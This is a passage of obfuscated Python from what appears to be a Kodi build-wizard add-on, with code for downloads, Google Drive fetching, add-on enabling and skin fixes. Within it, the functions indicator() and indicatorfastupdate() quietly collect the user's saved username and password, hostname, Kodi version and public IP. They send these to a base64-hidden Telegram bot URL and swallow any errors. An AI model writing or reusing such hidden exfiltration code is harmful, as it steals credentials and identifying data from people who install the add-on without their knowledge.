  OO0O0OO0O0OOO0000 =open (OOO0OOOO0OO000O0O ,'wb')#line:3445
  try :#line:3447
    OO00O000OOO0O0OOO =O0OOO000000O0OOOO .info ().getheader ('Content-Length').strip ()#line:3448
    OO00O0OO00O00000O =True #line:3449
  except AttributeError :#line:3450
        OO00O0OO00O00000O =False #line:3451
  if OO00O0OO00O00000O :#line:3453
        OO00O000OOO0O0OOO =int (OO00O000OOO0O0OOO )#line:3454
  O00O0000000O0O000 =0 #line:3456
  O00000O0OOOOOO0OO =time .time ()#line:3457
  while True :#line:3458
        OOO00OOOO0OOOOOO0 =O0OOO000000O0OOOO .read (8192 )#line:3459
        if not OOO00OOOO0OOOOOO0 :#line:3460
            sys .stdout .write ('\n')#line:3461
            break #line:3462
        O00O0000000O0O000 +=len (OOO00OOOO0OOOOOO0 )#line:3464
        OO0O0OO0O0OOO0000 .write (OOO00OOOO0OOOOOO0 )#line:3465
        if not OO00O0OO00O00000O :#line:3467
            OO00O000OOO0O0OOO =O00O0000000O0O000 #line:3468
        if O0O00O0OO0O00OO00 .iscanceled ():#line:3469
           O0O00O0OO0O00OO00 .close ()#line:3470
           try :#line:3471
            os .remove (OOO0OOOO0OO000O0O )#line:3472
           except :#line:3473
            pass #line:3474
           break #line:3475
        OO00000000OO0OOO0 =float (O00O0000000O0O000 )/OO00O000OOO0O0OOO #line:3476
        OO00000000OO0OOO0 =round (OO00000000OO0OOO0 *100 ,2 )#line:3477
        O0OO000OO00O0000O =O00O0000000O0O000 /(1024 *1024 )#line:3478
        OOOOOOO0O0OOOOOO0 =OO00O000OOO0O0OOO /(1024 *1024 )#line:3479
        O00OOO000000OO00O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO000OO00O0000O ,'teal',OOOOOOO0O0OOOOOO0 )#line:3480
        if (time .time ()-O00000O0OOOOOO0OO )>0 :#line:3481
          OOO0000OOO000O0O0 =O00O0000000O0O000 /(time .time ()-O00000O0OOOOOO0OO )#line:3482
          OOO0000OOO000O0O0 =OOO0000OOO000O0O0 /1024 #line:3483
        else :#line:3484
         OOO0000OOO000O0O0 =0 #line:3485
        O0OOO0OOO00OO000O ='KB'#line:3486
        if OOO0000OOO000O0O0 >=1024 :#line:3487
           OOO0000OOO000O0O0 =OOO0000OOO000O0O0 /1024 #line:3488
           O0OOO0OOO00OO000O ='MB'#line:3489
        if OOO0000OOO000O0O0 >0 and not OO00000000OO0OOO0 ==100 :#line:3490
            OO00000O0000000O0 =(OO00O000OOO0O0OOO -O00O0000000O0O000 )/OOO0000OOO000O0O0 #line:3491
        else :#line:3492
            OO00000O0000000O0 =0 #line:3493
        OO0OOOO0O0000O0O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0000OOO000O0O0 ,O0OOO0OOO00OO000O )#line:3494
        O0O00O0OO0O00OO00 .update (int (OO00000000OO0OOO0 ),"Downloading "+name ,O00OOO000000OO00O ,OO0OOOO0O0000O0O0 )#line:3496
  OOO0000OOOOOOOOO0 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3499
  OO0O0OO0O0OOO0000 .close ()#line:3501
  extract (OOO0OOOO0OO000O0O ,OOO0000OOOOOOOOO0 ,O0O00O0OO0O00OO00 )#line:3503
  if os .path .exists (OOO0000OOOOOOOOO0 +'/scakemyer-script.quasar.burst'):#line:3504
    if os .path .exists (OOO0000OOOOOOOOO0 +'/script.quasar.burst'):#line:3505
     shutil .rmtree (OOO0000OOOOOOOOO0 +'/script.quasar.burst',ignore_errors =False )#line:3506
    os .rename (OOO0000OOOOOOOOO0 +'/scakemyer-script.quasar.burst',OOO0000OOOOOOOOO0 +'/script.quasar.burst')#line:3507
  if os .path .exists (OOO0000OOOOOOOOO0 +'/plugin.video.kmediatorrent-master'):#line:3509
    if os .path .exists (OOO0000OOOOOOOOO0 +'/plugin.video.kmediatorrent'):#line:3510
     shutil .rmtree (OOO0000OOOOOOOOO0 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3511
    os .rename (OOO0000OOOOOOOOO0 +'/plugin.video.kmediatorrent-master',OOO0000OOOOOOOOO0 +'/plugin.video.kmediatorrent')#line:3512
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3513
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3514
  try :#line:3515
    os .remove (OOO0OOOO0OO000O0O )#line:3516
  except :#line:3517
    pass #line:3518
  O0O00O0OO0O00OO00 .close ()#line:3519
def dis_or_enable_addon (O0O0OOOO0OOOO0000 ,O0O0OOO00OO0O0000 ,enable ="true"):#line:3520
    import json #line:3521
    O0O000O0O0OOO0O0O ='"%s"'%O0O0OOOO0OOOO0000 #line:3522
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0O0OOOO0OOOO0000 )and enable =="true":#line:3523
        logging .warning ('already Enabled')#line:3524
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0O0OOOO0OOOO0000 )#line:3525
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0O0OOOO0OOOO0000 )and enable =="false":#line:3526
        return xbmc .log ("### Skipped %s, reason = not installed"%O0O0OOOO0OOOO0000 )#line:3527
    else :#line:3528
        O0OOOOO0O00O00O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0O000O0O0OOO0O0O ,enable )#line:3529
        O00OOO0000O00OOOO =xbmc .executeJSONRPC (O0OOOOO0O00O00O00 )#line:3530
        OO0OO000000O0O000 =json .loads (O00OOO0000O00OOOO )#line:3531
        if enable =="true":#line:3532
            xbmc .log ("### Enabled %s, response = %s"%(O0O0OOOO0OOOO0000 ,OO0OO000000O0O000 ))#line:3533
        else :#line:3534
            xbmc .log ("### Disabled %s, response = %s"%(O0O0OOOO0OOOO0000 ,OO0OO000000O0O000 ))#line:3535
    if O0O0OOO00OO0O0000 =='auto':#line:3536
     return True #line:3537
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3538
def chunk_report (O0OO00O000OO00000 ,OOO00O0O0O0O0O000 ,OOO00O00O0OO0000O ):#line:3539
   OOO0O0OO0OOOOO00O =float (O0OO00O000OO00000 )/OOO00O00O0OO0000O #line:3540
   OOO0O0OO0OOOOO00O =round (OOO0O0OO0OOOOO00O *100 ,2 )#line:3541
   if O0OO00O000OO00000 >=OOO00O00O0OO0000O :#line:3543
      sys .stdout .write ('\n')#line:3544
def chunk_read (O00000O0OOO00O00O ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3546
   import time #line:3547
   O0O0O0O0OOO00OO0O =int (filesize )*1000000 #line:3548
   OO000O000O0O00000 =0 #line:3550
   O000OO0000O0OOO00 =time .time ()#line:3551
   OO0OOOO0OOO000OOO =0 #line:3552
   logging .warning ('Downloading')#line:3554
   with open (destination ,"wb")as O00O000O00O0O0O0O :#line:3555
    while 1 :#line:3556
      OOOOOO00OO000O0OO =time .time ()-O000OO0000O0OOO00 #line:3557
      OOO0O0OOO00000000 =int (OO0OOOO0OOO000OOO *chunk_size )#line:3558
      O00OOOO00OO0OO000 =O00000O0OOO00O00O .read (chunk_size )#line:3559
      O00O000O00O0O0O0O .write (O00OOOO00OO0OO000 )#line:3560
      O00O000O00O0O0O0O .flush ()#line:3561
      OO000O000O0O00000 +=len (O00OOOO00OO0OO000 )#line:3562
      OO000OOOOOOO00000 =float (OO000O000O0O00000 )/O0O0O0O0OOO00OO0O #line:3563
      OO000OOOOOOO00000 =round (OO000OOOOOOO00000 *100 ,2 )#line:3564
      if int (OOOOOO00OO000O0OO )>0 :#line:3565
        OO0O00O000OO0000O =int (OOO0O0OOO00000000 /(1024 *OOOOOO00OO000O0OO ))#line:3566
      else :#line:3567
         OO0O00O000OO0000O =0 #line:3568
      if OO0O00O000OO0000O >1024 and not OO000OOOOOOO00000 ==100 :#line:3569
          O0OOOO0000OO0OOO0 =int (((O0O0O0O0OOO00OO0O -OOO0O0OOO00000000 )/1024 )/(OO0O00O000OO0000O ))#line:3570
      else :#line:3571
          O0OOOO0000OO0OOO0 =0 #line:3572
      if O0OOOO0000OO0OOO0 <0 :#line:3573
        O0OOOO0000OO0OOO0 =0 #line:3574
      dp .update (int (OO000OOOOOOO00000 ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO000OOOOOOO00000 ,OOO0O0OOO00000000 /(1024 *1024 ),O0O0O0O0OOO00OO0O /(1000 *1000 ),OO0O00O000OO0000O ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O0OOOO0000OO0OOO0 ,60 ))#line:3575
      if dp .iscanceled ():#line:3576
         dp .close ()#line:3577
         break #line:3578
      if not O00OOOO00OO0OO000 :#line:3579
         break #line:3580
      if report_hook :#line:3582
         report_hook (OO000O000O0O00000 ,chunk_size ,O0O0O0O0OOO00OO0O )#line:3583
      OO0OOOO0OOO000OOO +=1 #line:3584
   logging .warning ('END Downloading')#line:3585
   return OO000O000O0O00000 #line:3586
def googledrive_download (OO0O0OO0OOO0O0O00 ,OOOO000O000OOOOOO ,O000OO0OOO0OOOOOO ,OOOO0O0O0OOOOOOO0 ):#line:3588
    O0OO0O000000OOO0O =[]#line:3592
    OOO0OOOO0OOO000O0 =OO0O0OO0OOO0O0O00 .split ('=')#line:3593
    OO0O0OO0OOO0O0O00 =OOO0OOOO0OOO000O0 [len (OOO0OOOO0OOO000O0 )-1 ]#line:3594
    def O00O0O00OOO00O0OO (O0O000OO0OO0O00O0 ):#line:3596
        for OO000O0OOO00000OO in O0O000OO0OO0O00O0 :#line:3598
            logging .warning ('cookie.name')#line:3599
            logging .warning (OO000O0OOO00000OO .name )#line:3600
            O0OOO000O0O0O000O =OO000O0OOO00000OO .value #line:3601
            if 'download_warning'in OO000O0OOO00000OO .name :#line:3602
                logging .warning (OO000O0OOO00000OO .value )#line:3603
                logging .warning ('cookie.value')#line:3604
                return OO000O0OOO00000OO .value #line:3605
            return O0OOO000O0O0O000O #line:3606
        return None #line:3608
    def OOOO00O00O0O00O0O (O000OOO0OOOOO000O ,OOO0000OO0O0O000O ):#line:3610
        O000O0O0O0O0OOO00 =32768 #line:3612
        OO0O0O00000OOO00O =time .time ()#line:3613
        with open (OOO0000OO0O0O000O ,"wb")as O00OOOOO0OOO00O0O :#line:3615
            OO000OO0O0OO000OO =1 #line:3616
            OO0OO000000O00OO0 =32768 #line:3617
            try :#line:3618
                OO00O0O00OO000OO0 =int (O000OOO0OOOOO000O .headers .get ('content-length'))#line:3619
                print ('file total size :',OO00O0O00OO000OO0 )#line:3620
            except TypeError :#line:3621
                print ('using dummy length !!!')#line:3622
                OO00O0O00OO000OO0 =int (OOOO0O0O0OOOOOOO0 )*1000000 #line:3623
            for O0000OO0OO00O0OO0 in O000OOO0OOOOO000O .iter_content (O000O0O0O0O0OOO00 ):#line:3624
                if O0000OO0OO00O0OO0 :#line:3625
                    O00OOOOO0OOO00O0O .write (O0000OO0OO00O0OO0 )#line:3626
                    O00OOOOO0OOO00O0O .flush ()#line:3627
                    O0OOO0O000O0OO000 =time .time ()-OO0O0O00000OOO00O #line:3628
                    OOO00O00OO00000O0 =int (OO000OO0O0OO000OO *OO0OO000000O00OO0 )#line:3629
                    if O0OOO0O000O0OO000 ==0 :#line:3630
                        O0OOO0O000O0OO000 =0.1 #line:3631
                    OO00000O0000OOOOO =int (OOO00O00OO00000O0 /(1024 *O0OOO0O000O0OO000 ))#line:3632
                    O00OOOOOO0O0O0000 =int (OO000OO0O0OO000OO *OO0OO000000O00OO0 *100 /OO00O0O00OO000OO0 )#line:3633
                    if OO00000O0000OOOOO >1024 and not O00OOOOOO0O0O0000 ==100 :#line:3634
                      O0O0000OOOO0OO000 =int (((OO00O0O00OO000OO0 -OOO00O00OO00000O0 )/1024 )/(OO00000O0000OOOOO ))#line:3635
                    else :#line:3636
                      O0O0000OOOO0OO000 =0 #line:3637
                    O000OO0OOO0OOOOOO .update (int (O00OOOOOO0O0O0000 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O00OOOOOO0O0O0000 ,OOO00O00OO00000O0 /(1024 *1024 ),OO00O0O00OO000OO0 /(1000 *1000 ),OO00000O0000OOOOO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O0000OOOO0OO000 ,60 ))#line:3639
                    OO000OO0O0OO000OO +=1 #line:3640
                    if O000OO0OOO0OOOOOO .iscanceled ():#line:3641
                     O000OO0OOO0OOOOOO .close ()#line:3642
                     break #line:3643
    O0O00OO0OO000000O ="https://docs.google.com/uc?export=download"#line:3644
    import urllib2 #line:3649
    import cookielib #line:3650
    from cookielib import CookieJar #line:3652
    O0OOOO00OO0OO00O0 =CookieJar ()#line:3654
    O0OOOOOO000O0OOOO =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0OOOO00OO0OO00O0 ))#line:3655
    O0O000O000O000OOO ={'id':OO0O0OO0OOO0O0O00 }#line:3657
    OOOO000OOOO0000OO =urllib .urlencode (O0O000O000O000OOO )#line:3658
    logging .warning (O0O00OO0OO000000O +'&'+OOOO000OOOO0000OO )#line:3659
    O0000000OO000OOO0 =O0OOOOOO000O0OOOO .open (O0O00OO0OO000000O +'&'+OOOO000OOOO0000OO )#line:3660
    O00000000O0O0OOOO =O0000000OO000OOO0 .read ()#line:3661
    for OOOOO000OO00O000O in O0OOOO00OO0OO00O0 :#line:3663
         logging .warning (OOOOO000OO00O000O )#line:3664
    O0OOO0O0000OO0O00 =O00O0O00OOO00O0OO (O0OOOO00OO0OO00O0 )#line:3665
    logging .warning (O0OOO0O0000OO0O00 )#line:3666
    if O0OOO0O0000OO0O00 :#line:3667
        OO0O0O0O0OOOOOOO0 ={'id':OO0O0OO0OOO0O0O00 ,'confirm':O0OOO0O0000OO0O00 }#line:3668
        O00O0OO00OO0OOOO0 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3669
        OOOO000OOOO0000OO =urllib .urlencode (OO0O0O0O0OOOOOOO0 )#line:3670
        O0000000OO000OOO0 =O0OOOOOO000O0OOOO .open (O0O00OO0OO000000O +'&'+OOOO000OOOO0000OO )#line:3671
        chunk_read (O0000000OO000OOO0 ,report_hook =chunk_report ,dp =O000OO0OOO0OOOOOO ,destination =OOOO000O000OOOOOO ,filesize =OOOO0O0O0OOOOOOO0 )#line:3672
    return (O0OO0O000000OOO0O )#line:3676
def kodi17Fix ():#line:3677
	O0O0OOO0000OO00OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3678
	O00OOO0O0OOO0OOOO =[]#line:3679
	for OOOO00000000OOOO0 in sorted (O0O0OOO0000OO00OO ,key =lambda OO0O0000O0O0O0000 :OO0O0000O0O0O0000 ):#line:3680
		O00OOOOOOOOO00OOO =os .path .join (OOOO00000000OOOO0 ,'addon.xml')#line:3681
		if os .path .exists (O00OOOOOOOOO00OOO ):#line:3682
			OO0OO0O0OOOOOO0OO =OOOO00000000OOOO0 .replace (ADDONS ,'')[1 :-1 ]#line:3683
			OO0OO00000O0O000O =open (O00OOOOOOOOO00OOO )#line:3684
			OO0OO00O0O0O000OO =OO0OO00000O0O000O .read ()#line:3685
			O0000000000O00OO0 =parseDOM (OO0OO00O0O0O000OO ,'addon',ret ='id')#line:3686
			OO0OO00000O0O000O .close ()#line:3687
			try :#line:3688
				O0O0O0OOOOOOOOOOO =xbmcaddon .Addon (id =O0000000000O00OO0 [0 ])#line:3689
			except :#line:3690
				try :#line:3691
					log ("%s was disabled"%O0000000000O00OO0 [0 ],xbmc .LOGDEBUG )#line:3692
					O00OOO0O0OOO0OOOO .append (O0000000000O00OO0 [0 ])#line:3693
				except :#line:3694
					try :#line:3695
						log ("%s was disabled"%OO0OO0O0OOOOOO0OO ,xbmc .LOGDEBUG )#line:3696
						O00OOO0O0OOO0OOOO .append (OO0OO0O0OOOOOO0OO )#line:3697
					except :#line:3698
						if len (O0000000000O00OO0 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OO0OO0O0OOOOOO0OO ,xbmc .LOGERROR )#line:3699
						else :log ("Unabled to enable: %s"%OOOO00000000OOOO0 ,xbmc .LOGERROR )#line:3700
	if len (O00OOO0O0OOO0OOOO )>0 :#line:3701
		OO0O0OO0O00O000O0 =0 #line:3702
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3703
		for O0O0000OO00O00OOO in O00OOO0O0OOO0OOOO :#line:3704
			OO0O0OO0O00O000O0 +=1 #line:3705
			O0O00000O00O0O00O =int (percentage (OO0O0OO0O00O000O0 ,len (O00OOO0O0OOO0OOOO )))#line:3706
			DP .update (O0O00000O00O0O00O ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0000OO00O00OOO ))#line:3707
			addonDatabase (O0O0000OO00O00OOO ,1 )#line:3708
			if DP .iscanceled ():break #line:3709
		if DP .iscanceled ():#line:3710
			DP .close ()#line:3711
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3712
			sys .exit ()#line:3713
		DP .close ()#line:3714
	forceUpdate ()#line:3715
def indicator ():#line:3717
       try :#line:3718
          import json #line:3719
          wiz .log ('FRESH MESSAGE')#line:3720
          O0O00OO000O00OOOO =(ADDON .getSetting ("user"))#line:3721
          OO0O0OOOO0O00OOO0 =(ADDON .getSetting ("pass"))#line:3722
          OO0O00O0000OO00O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3723
          O00O0O0O0O00O00O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3724
          OOOOO0OOO00O0OO00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3725
          OOO00O0O0OOO0OO00 =str (json .loads (OOOOO0OOO00O0OO00 )['ip'])#line:3726
          OO000O0000000O0OO =O0O00OO000O00OOOO #line:3727
          O0OO00OO0OOO0OO0O =OO0O0OOOO0O00OOO0 #line:3728
          import socket #line:3729
          OOOOO0OOO00O0OO00 =urllib2 .urlopen (O00O0O0O0O00O00O0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO000O0000000O0OO +' - '+O0OO00OO0OOO0OO0O +' - '+OO0O00O0000OO00O0 +' - '+OOO00O0O0OOO0OO00 ).readlines ()#line:3730
       except :pass #line:3732
def indicatorfastupdate ():#line:3734
       try :#line:3735
          import json #line:3736
          wiz .log ('FRESH MESSAGE')#line:3737
          OO000O000O0O0OO0O =(ADDON .getSetting ("user"))#line:3738
          O00000OO0000OO000 =(ADDON .getSetting ("pass"))#line:3739
          O00OOO0O0OOO0OO00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3740
          O0O0O00OOO0O0O0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3742
          OO0O0O0O0OO00O00O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3743
          O0OOO0O000OOO00OO =str (json .loads (OO0O0O0O0OO00O00O )['ip'])#line:3744
          O000O00000O0OO000 =OO000O000O0O0OO0O #line:3745
          OO0OOOOOOOO0O00OO =O00000OO0000OO000 #line:3746
          import socket #line:3748
          OO0O0O0O0OO00O00O =urllib2 .urlopen (O0O0O00OOO0O0O0O0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O000O00000O0OO000 +' - '+OO0OOOOOOOO0O00OO +' - '+O00OOO0O0OOO0OO00 +' - '+O0OOO0O000OOO00OO ).readlines ()#line:3749
       except :pass #line:3751
def skinfix18 ():#line:3753
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3754
		O0O0OO0OOOO0OO0O0 =wiz .workingURL (SKINID18DDONXML )#line:3755
		if O0O0OO0OOOO0OO0O0 ==True :#line:3756
			OOO000OOOO00O00OO =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3757
			if len (OOO000OOOO00O00OO )>0 :#line:3758
				OO0OO0000O0OO00O0 ='%s-%s.zip'%(SKINID18 ,OOO000OOOO00O00OO [0 ])#line:3759
				O000OOO000OOOO00O =wiz .workingURL (SKIN18ZIPURL +OO0OO0000O0OO00O0 )#line:3760
				if O000OOO000OOOO00O ==True :#line:3761
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3762
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3763
					OOO00OO00OOOOOOOO =os .path .join (PACKAGES ,OO0OO0000O0OO00O0 )#line:3764
					try :os .remove (OOO00OO00OOOOOOOO )#line:3765
					except :pass #line:3766
					downloader .download (SKIN18ZIPURL +OO0OO0000O0OO00O0 ,OOO00OO00OOOOOOOO ,DP )#line:3767
					extract .all (OOO00OO00OOOOOOOO ,HOME ,DP )#line:3768
					try :#line:3769
						O0O000OOO00000OOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3770
						OO000OO00O0O0000O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3771
						os .rename (O0O000OOO00000OOO ,OO000OO00O0O0000O )#line:3772
					except :#line:3773
						pass #line:3774
					try :#line:3775
						O000000O000O0OOOO =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OOO000O0O0OOO0O0O =O000000O000O0OOOO .read ();O000000O000O0OOOO .close ()#line:3776
						OOO00OOO0OO000OOO =wiz .parseDOM (OOO000O0O0OOO0O0O ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3777
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00OOO0OO000OOO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3778
					except :#line:3779
						pass #line:3780
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3781
					DP .close ()#line:3782
					xbmc .sleep (500 )#line:3783
					wiz .forceUpdate (True )#line:3784
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3785
				else :#line:3786
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3787
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O000OOO000OOOO00O ,xbmc .LOGERROR )#line:3788
			else :#line:3789
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3790
		else :#line:3791
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3792
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3793
def skinfix17 ():#line:3794
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3795
		OO0O0O0O0O0000O00 =wiz .workingURL (SKINID17DDONXML )#line:3796
		if OO0O0O0O0O0000O00 ==True :#line:3797
			O000O0O00OOOOO0OO =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3798
			if len (O000O0O00OOOOO0OO )>0 :#line:3799
				OO0OOOO0O0OOOOO00 ='%s-%s.zip'%(SKINID17 ,O000O0O00OOOOO0OO [0 ])#line:3800
				O0O0OOOO0OOOOOOOO =wiz .workingURL (SKIN17ZIPURL +OO0OOOO0O0OOOOO00 )#line:3801
				if O0O0OOOO0OOOOOOOO ==True :#line:3802
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3803
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3804
					O00OOO000O0O0O00O =os .path .join (PACKAGES ,OO0OOOO0O0OOOOO00 )#line:3805
					try :os .remove (O00OOO000O0O0O00O )#line:3806
					except :pass #line:3807
					downloader .download (SKIN17ZIPURL +OO0OOOO0O0OOOOO00 ,O00OOO000O0O0O00O ,DP )#line:3808
					extract .all (O00OOO000O0O0O00O ,HOME ,DP )#line:3809
					try :#line:3810
						O0O000OOO00OOO00O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3811
						O00O00OO000O0OOO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3812
						os .rename (O0O000OOO00OOO00O ,O00O00OO000O0OOO0 )#line:3813
					except :#line:3814
						pass #line:3815
					try :#line:3816
						O0OOOOO00OOO00OO0 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OOOOOO0OO000O0O0O =O0OOOOO00OOO00OO0 .read ();O0OOOOO00OOO00OO0 .close ()#line:3817
						O0OOOOO0O0O0O0000 =wiz .parseDOM (OOOOOO0OO000O0O0O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3818
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOOO0O0O0O0000 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3819
					except :#line:3820
						pass #line:3821
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3822
					DP .close ()#line:3823
					xbmc .sleep (500 )#line:3824
					wiz .forceUpdate (True )#line:3825
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3826
				else :#line:3827
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3828
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O0OOOO0OOOOOOOO ,xbmc .LOGERROR )#line:3829
			else :#line:3830
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3831
		else :#line:3832
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3833
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3834
def fix17update ():#line:3835
	if KODIV >=17 and KODIV <18 :#line:3836
		wiz .kodi17Fix ()#line:3837
		xbmc .sleep (4000 )#line:3838
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3839
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3840
		fixfont ()#line:3841
		O000OO00OO000000O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3842
		try :#line:3844
			O00OO00OO0O0000O0 =open (O000OO00OO000000O ,'r')#line:3845
			OO0O0O0OOOO00OOOO =O00OO00OO0O0000O0 .read ()#line:3846
			O00OO00OO0O0000O0 .close ()#line:3847
			O0OO00OOOOOO0OOOO ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3848
			O0OOO00O00OO0OOO0 =re .compile (O0OO00OOOOOO0OOOO ).findall (OO0O0O0OOOO00OOOO )[0 ]#line:3849
			O00OO00OO0O0000O0 =open (O000OO00OO000000O ,'w')#line:3850
			O00OO00OO0O0000O0 .write (OO0O0O0OOOO00OOOO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O0OOO00O00OO0OOO0 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3851
			O00OO00OO0O0000O0 .close ()#line:3852
		except :#line:3853
				pass #line:3854
		wiz .kodi17Fix ()#line:3855
		O000OO00OO000000O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3856
		try :#line:3857
			O00OO00OO0O0000O0 =open (O000OO00OO000000O ,'r')#line:3858
			OO0O0O0OOOO00OOOO =O00OO00OO0O0000O0 .read ()#line:3859
			O00OO00OO0O0000O0 .close ()#line:3860
			O0OO00OOOOOO0OOOO ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3861
			O0OOO00O00OO0OOO0 =re .compile (O0OO00OOOOOO0OOOO ).findall (OO0O0O0OOOO00OOOO )[0 ]#line:3862
			O00OO00OO0O0000O0 =open (O000OO00OO000000O ,'w')#line:3863
			O00OO00OO0O0000O0 .write (OO0O0O0OOOO00OOOO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O0OOO00O00OO0OOO0 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3864
			O00OO00OO0O0000O0 .close ()#line:3865
